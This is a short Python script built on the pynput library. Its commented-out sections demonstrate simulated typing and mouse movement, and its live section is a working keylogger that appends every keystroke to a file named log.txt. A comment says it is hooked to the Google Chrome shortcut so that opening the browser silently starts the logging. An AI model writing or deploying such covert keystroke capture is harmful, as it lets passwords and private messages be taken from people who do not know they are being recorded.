from pynput.keyboard import Listener,Key,Controller
from pynput.mouse import Button,Controller














# Basic keyboard controller
# keyboard = Controller()
# def say(word):
#     keyboard.type(word)
#     keyboard.press(Key.enter)
#     keyboard.release(Key.enter)
# say("something")


# Basic mouse controller
# mouse = Controller()
# def mouseControl():
#     mouse.click(Button.right,1)
#     mouse.press(Button.left)
#     mouse.move(900,900)
#     x=0
#     while x <=1:
#         mouse.scroll(0,10)
#         x+=1
# mouseControl()


# This is the key logger. It is associated with the google chrome shortcut. Opening chrome shortcut will automatically turn on the keylogger. All pressed keys will be store in a text file named "log"
def anonymous(key):
    key = str(key)
    key = key.replace("'","")
    if key == "Key.f12":
        raise SystemExit(0)
    if key == "Key.alt_l":
        key = "\n"
    if key == "Key.enter":
        key = "\n"
    if key == "Key.ctrl_l":
        key = "\n"
    if key == "Key.tab":
        key = "\n"
    with open("log.txt","a") as file:
        file.write(key)
    print(key)

with Listener(on_press = anonymous) as listener:
    listener.join()
